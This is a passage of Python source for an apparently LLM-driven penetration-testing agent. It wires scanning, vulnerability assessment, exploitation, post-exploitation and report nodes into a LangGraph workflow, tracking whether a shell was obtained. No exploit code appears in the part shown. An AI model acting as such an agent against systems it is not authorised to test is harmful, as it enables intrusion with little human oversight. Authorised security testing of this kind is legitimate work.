    Include severity ratings for vulnerabilities (Critical, High, Medium, Low).
    """
    
    prompt = ChatPromptTemplate.from_messages([
        ("system", system_prompt),
        ("human", """Generate penetration testing report:
        
        Target: {ip}
        Scan Results: {scan_results}
        Vulnerabilities: {vulns}
        Exploitation Attempted: {exploitation_attempt}
        Shell Success: {shell_success}
        Errors Encountered: {errors}
        """)
    ])
    
    try:
        chain = prompt | llm
        response = chain.invoke({
            "ip": state['ip'],
            "scan_results": state['scan_results'],
            "vulns": state['vulns'],
            "exploitation_attempt": state['exploitation_attempt'],
            "shell_success": state['shell_success'],
            "errors": state.get('errors', [])
        })
        
        state['report'] = response.content
        state['messages'].append(response)
        
    except Exception as e:
        error_msg = f"Analysis failed: {str(e)}"
        print(error_msg)
        state['errors'].append(error_msg)
        state['report'] = f"Report generation failed: {str(e)}"
    
    return state

# Create the workflow
def create_recon_workflow():
    """Create workflow with conditional scanning logic and recursion limit"""
    workflow = StateGraph(ReconState)
    
    # Add all nodes
    workflow.add_node("planning", planning_node)
    workflow.add_node("scan", scan_node) 
    workflow.add_node("vuln_assessment", vuln_assessment_node)
    workflow.add_node("exploitation", exploitation_node)
    workflow.add_node("post_exploitation", post_exploitation_node)
    workflow.add_node("analysis", analysis_node)
    workflow.add_node("tools", tool_node)
    
    #Creating edges
    workflow.set_entry_point("planning")
    workflow.add_edge("planning", "scan")
    workflow.add_conditional_edges(
        "scan",
        should_continue_scanning,  # Decision function
        {
            "scan": "scan",                    # Loop back for more scanning
            "vuln_assessment": "vuln_assessment"  # Move to vulnerability assessment
        }
    )
    
    workflow.add_edge("vuln_assessment", "exploitation")
    workflow.add_conditional_edges(
        "exploitation",
        should_continue_to_post_exploit,
        {
            "post_exploitation": "post_exploitation", # If shell, go here
            "analysis": "analysis"                  # If no shell, go here
        }
    )
    workflow.add_edge("post_exploitation", "analysis")
    workflow.add_edge("analysis", END)
    
    return workflow.compile()


# Usage example and state initialization helper
def initialize_recon_state(ip: str, user_input: str, llm_provider: str, 
                          api_key: str, local_model: str = None) -> ReconState:
    """Initialize a ReconState with default values"""
    return ReconState(
        ip=ip,
        user_input=user_input,
        scan_results={},
        vulns=[],
        exploitation_attempt=False,
        shell_success=False,
        report="",
        llm_provider=llm_provider,
        api_key=api_key,
        local_model=local_model or "",
        messages=[],
        current_step="",
        errors=[],
        # Progressive scanning fields
        scan_progression=[],
        discovered_services={},
        max_scan_iterations=4
    )

# Main execution function
def run_reconnaissance(ip: str, user_input: str, llm_provider: str, 
                      api_key: str, local_model: str = None) -> ReconState:
    """Run the complete reconnaissance workflow"""
    
    # Create workflow
    app = create_recon_workflow()
    
    # Initialize state
    initial_state = initialize_recon_state(ip, user_input, llm_provider, api_key, local_model)
    
    # Execute workflow
    final_state = app.invoke(initial_state)
    
    return final_state

